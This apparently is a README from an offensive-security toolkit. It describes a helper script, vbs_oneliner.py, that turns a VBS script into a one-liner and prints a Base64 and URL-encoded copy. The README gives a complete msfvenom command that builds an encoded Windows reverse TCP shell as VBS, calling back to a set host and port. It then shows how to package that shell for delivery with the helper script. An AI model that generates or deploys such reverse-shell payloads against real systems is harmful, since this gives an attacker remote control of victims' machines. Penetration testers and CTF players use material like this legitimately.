# Auxiliar scripts

## vbs_oneliner.py
Creates a oneliner of a VBS script. Also prints a Base64 + URL encoded string of it.

You can create a revershe shell in VBS with:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.133.120 LPORT=80 -e x86/shikata_ga_nai -f vbs -o rev.vbs
```
Then, use the script
```bash
python3 vbs_oneliner.py rev.vbs
```
Then, you will have `rev_oneliner.vbs` and the Base64 + URL Encoded string as the output.
